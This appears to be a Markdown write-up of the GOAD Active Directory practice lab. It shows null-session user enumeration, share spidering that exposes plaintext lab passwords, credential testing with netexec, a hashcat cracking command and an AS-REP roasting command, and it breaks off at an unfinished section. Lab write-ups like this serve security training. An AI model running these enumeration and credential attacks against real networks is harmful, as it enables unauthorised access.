
## User Enumeration
### 01 - Null Session Enumeration

#### Samwell Tarly

Samuel's Tarly's credentials were first to be discovered. For this task the following tools can be used to enumerate users
##### rpcclient

```bash
rpcclient -U "" //<IP_ADDRESS>
```

`enum` commands can be discovered by typing enum and pressing TAB on the keyboard

```ruby
┌──(qdada㉿GOAD-kali)-[~]
└─$ rpcclient -U "" --no-pass 192.168.56.11
rpcclient $> enum [TAB]
enumalsgroups              enumkey
enumdata                   enummonitors
enumdataex                 enumpermachineconnections
enumdomains                enumports
enumdomgroups              enumprinters
enumdomusers               enumprivs
enumdrivers                enumprocdatatypes
enumforms                  enumprocs
enumjobs                   enumtrust
rpcclient $>
```

the command we are looking for is `enumdomusers`

```ruby
┌──(qdada㉿GOAD-kali)-[~]
└─$ rpcclient -U "" --no-pass 192.168.56.11
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]
rpcclient $>
```

domain groups are enumerated in a similar way

```bash
rpcclient $> enumdomgroups
```

<div align="center" ><img width='65%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/02-enumdomaingroups.png'><br><ins>Enumerating Domain Groups</ins></div>



##### enum4linux

This command is most effective in that in one command reveals users, groups as well as important information in the description column of the ADUC ( [Active Directory Users and Computers](https://learn.microsoft.com/en-us/answers/questions/430532/active-directory-users-and-computers) ). On this host, a password is leaked for the user **samwell.tally**.


<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/03-Active-Directory-Users-and-Computers.png'><br><ins>Password leakage on ADUC</ins></div>

```bash
enum4linux -U 192.168.56.11
```

<div align="center" ><img width='95%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/04-enum4linux.png'><br><ins>Enum4linix enumeration</ins></div>

A more elaborate command that lists group membership in a single command but it lacks the DESCRIPTION field information.

```bash
enum4linux -a -r -K 5000 192.168.56.11
```
##### Netexec

Netexec can be used to perform null session enumeration. If you have it installed, the command is

```ruby
nxc smb 192.168.56.11 --users
```

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/05-netexec-anonymous-user-enumeration.png'><br><ins>Netexec user enumeration</ins></div>

### 02 - Authenticated Enumeration

#### Arya Stark

Using credentials discovered from null session enumeration that revealed sensitive information disclosure where credentials were left in the open.

```bash
#obtained by 
nxc smb 192.168.56.0/24 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus

#that command  produced the following
┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
└─$ ls -al
total 40
drwxr-xr-x  2 qdada qdada  4096 May  8 14:27 .
drwxrwxrwt 16 root  root  12288 May  8 14:26 ..
-rw-r--r--  1 qdada qdada  3345 May  8 14:27 192.168.56.11.json
-rw-r--r--  1 qdada qdada   250 May  8 14:27 192.168.56.22.json
-rw-r--r--  1 qdada qdada    17 May  8 14:27 192.168.56.23.json
-rw-r--r--  1 qdada qdada  9569 May  8 14:27 initial_spider_plus.txt
```

typing **`cat 192.168.56.22.json`** produced

```ruby
┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
└─$ cat 192.168.56.22.json |jq
{
  "all": {
    "arya.txt": {
      "atime_epoch": "2024-05-04 10:06:27",
      "ctime_epoch": "2024-05-04 10:06:27",
      "mtime_epoch": "2024-05-04 10:06:39",
      "size": "413 B"
    }
  },
  "public": {}
}
```

That suggests the `all` share has the file **`arya.txt`**

Downloading shared files is achieved through

```ruby
nxc smb 192.168.56.0/24 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus -o DOWNLOAD_FLAG=True
```

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/06-netexec-download.png'><br><ins>Downloading results of spider command</ins></div>

typing `cat /tmp/nxc_spider_plus/192.168.56.22.json` produced

```json
{
  "all": {
    "arya.txt": {
      "atime_epoch": "2024-05-04 10:06:27",
      "ctime_epoch": "2024-05-04 10:06:27",
      "mtime_epoch": "2024-05-04 10:06:39",
      "size": "413 B"
    }
  },
  "public": {}
}
```

This suggests a text file called arya.txt exists under the "all" share.

typing `cat /tmp/nxc_spider_plus/192.168.56.22/all/arya.txt` produced

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/07-arya-password.png'><br><ins>Displaying arya.txt</ins></div>

The association with Arya and Needle cannot be overlooked when one is familiar with the show. It is not a leap to think that Needle may be the password. Netexec is run again to verify

```bash
nxc smb 192.168.56.0/24 -u 'arya.stark' -p 'Needle'
```


<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/08-arya-password-confirmation.png'><br><ins>Password Confirmed</ins></div>
#### Jeor Mormont

What can this Arya account access ? We run nxc once more ...

```bash
nxc smb 192.168.56.11,22-23 -u 'arya.stark' -p 'Needle' -M spider_plus -o DOWNLOAD_FLAG=True
```

That command downloads files including `NETLOGON/script.ps1`

```powershell
┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus/192.168.56.11/NETLOGON]
└─$ cat script.ps1
# fake script in netlogon with creds
$task = '/c TODO'
$taskName = "fake task"
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"
```

Once again the credentials are tested over again ...

```bash
nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users
```

It is discovered that Jeor Mormont has Administrator access on `CASTLEBLACK`, obviously.

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/09-Jeor-Mormont.png'><br><ins>Jeor Mormont</ins></div>


```ruby
hashcat.exe -m 18200 hashes\out.txt wordlist\rockyou.txt
```






### AS-REPRoasting

##### a. impacket-GetNPUsers

First 

```bash
impacket-GetNPUsers -dc-ip 192.168.56.11 'north.sevenkingdoms.local/' -no-pass -usersfile realusers.txt
```

We have 3 domains
```
sevenkingdoms.local
north.sevenkingdoms.local
essos.local
```



#### Brandon Stark

